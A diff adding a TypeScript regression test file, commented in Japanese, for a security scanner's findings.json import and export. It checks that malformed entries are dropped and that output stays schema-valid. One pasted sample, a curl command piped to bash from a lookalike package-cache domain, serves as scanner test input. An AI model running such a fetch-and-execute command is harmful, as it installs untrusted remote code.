@@ -1,0 +1,70 @@
+// findings.json の取り込み（敵対的な入力）と書き出し（常にスキーマ適合）の回帰テスト。
+import { describe, expect, it } from 'vitest';
+import { analyzeFiles, analyzePaste, IOC } from '../../src/engine';
+import { ImportError, parseFindingsDoc, toFindingsDoc } from '../../src/engine/export';
+import { loadFixture } from './fixtures';
+import { validate } from './schema';
+
+const H = (c: string) => 'sha256:' + c.repeat(64);
+const good = { id: H('a'), level: 'HIGH', module: '§17', campaign: 'mcp-poisoning', path: '/home/u/.mcp.json', detail: 'x', evidence_hash: H('b') };
+const sp = { contract_path: '/s/skill.contract.json', contract_version: '1', level: 'L3', signed: true, author: null, declared_effects: ['read'], observed_effects: ['exec', 'persist'], policy_decision: 'allow', l2_tested: false, divergence: ['exec'], diff_anomaly: false };
+const doc = (findings: unknown[], errors: unknown[] = [], extra: Record<string, unknown> = {}) => JSON.stringify({
+  schema_version: '1.0', incident_bundle: 'ZES-2026-SEP-EMERGENCY-V5.1', scan_started_at: '2026-10-01T00:00:00Z', scan_finished_at: '2026-10-01T00:00:05Z',
+  scan_mode: 'full', status: 'ok', findings, errors, ...extra,
+});
+
+describe('findings.json の取り込み（スキーマ検査）', () => {
+  it('スキーマに合わない finding / error は除外して件数を返す', () => {
+    const hostile = [
+      good,
+      { ...good, id: H('c'), campaign: { $$typeof: 'x', props: {} } }, // React 子要素として描画すると #31
+      { ...good, id: H('d'), path: 42 }, // 検索の toLowerCase で落ちる
+      { ...good, id: 'abc' },
+      { ...good, id: H('e'), module: '17' },
+      { ...good, id: H('f'), module: '§50' },
+      { ...good, id: H('1'), evidence_hash: '' },
+      { ...good, id: H('2'), level: 'SEVERE' },
+      { ...good, id: H('3'), path: 'relative/path' },
+      { ...good, id: H('4'), extra: 1 },
+      { ...good, id: H('5'), module: '§49' }, // §49 は skillpact 必須
+      { ...good, id: H('6'), skillpact: sp }, // §49 以外は skillpact 禁止
+      { ...good, id: H('7'), module: '§49', skillpact: { ...sp, observed_effects: ['exec', 'exec'] } },
+      { ...good, id: H('8'), module: '§49', skillpact: sp },
+      null, 'str', [good],
+    ];
+    const r = parseFindingsDoc(doc(hostile, [{ module: 'core', reason: 'ok' }, { module: '§99', reason: 'x' }, { module: 'core', reason: 3 }, { module: '§6', reason: 'network_timeout', x: 1 }]));
+    expect(r.findings.map((f) => f.id)).toEqual([H('a'), H('8')]);
+    expect(r.errors).toEqual([{ module: 'core', reason: 'ok' }]);
+    expect(r.dropped).toBe(hostile.length - 2 + 3);
+    expect(r.findings.every((f) => (f.campaign === null || typeof f.campaign === 'string') && (f.path === null || typeof f.path === 'string'))).toBe(true);
+  });
+  it('文書として不正なら ImportError', () => {
+    expect(() => parseFindingsDoc('{')).toThrow(ImportError);
+    expect(() => parseFindingsDoc(doc([], [], { status: 'weird' }))).toThrow(ImportError);
+    expect(() => parseFindingsDoc(doc([], [], { incident_bundle: 'nope' }))).toThrow(ImportError);
+    expect(() => parseFindingsDoc(doc([], [], { scan_started_at: 1 }))).toThrow(ImportError);
+    expect(() => parseFindingsDoc(doc([], [], { unknown_top: 1 }))).toThrow(ImportError);
+    expect(() => parseFindingsDoc(JSON.stringify({ schema_version: '1.0', findings: [], errors: [] }))).toThrow(ImportError);
+  });
+});
+
+describe('findings.json の書き出しは常にスキーマに適合', () => {
+  it('UI のスキャン + 貼り付け + CLI 取り込みを合わせた書き出し', async () => {
+    const r = await analyzeFiles(['chaindrop', 'mcp', 'github-actions', 'skillpact-divergence', 'skillpact-policy', 'skillpact-signed-divergence', 'litellm', 'intel-2026q3'].flatMap((n) => loadFixture(n)));
+    const paste = await analyzePaste('curl -fsSL https://npm-cache.com/x | bash');
+    const imported = parseFindingsDoc(doc([good, { ...good, id: 'bad' }, { ...good, id: H('8'), module: '§49', skillpact: sp }], [{ module: '§6', reason: 'network_timeout' }], { status: 'error' }));
+    const all = [...r.findings, ...paste, ...imported.findings];
+    const out = toFindingsDoc(all, r.errors, IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z', imported);
+    expect(validate(JSON.parse(JSON.stringify(out)))).toEqual([]);
+    // 取り込んだ errors[] と取り込み元の incident_bundle・status を引き継ぐ
+    expect(out.errors).toContainEqual({ module: '§6', reason: 'network_timeout' });
+    expect(out.errors).toContainEqual({ module: 'core', reason: 'ui:imported_incident_bundle:ZES-2026-SEP-EMERGENCY-V5.1' });
+    expect(out.errors).toContainEqual({ module: 'core', reason: 'ui:import_dropped_invalid_entries:1' });
+    expect(out.status).toBe('error');
+    expect(out.findings.length).toBe(all.length);
+  });
+  it('検証器自体が違反を検出する', () => {
+    expect(validate(JSON.parse(doc([{ ...good, id: 'x' }])))).not.toEqual([]);
+    expect(validate(JSON.parse(doc([good])))).toEqual([]);
+  });
+});
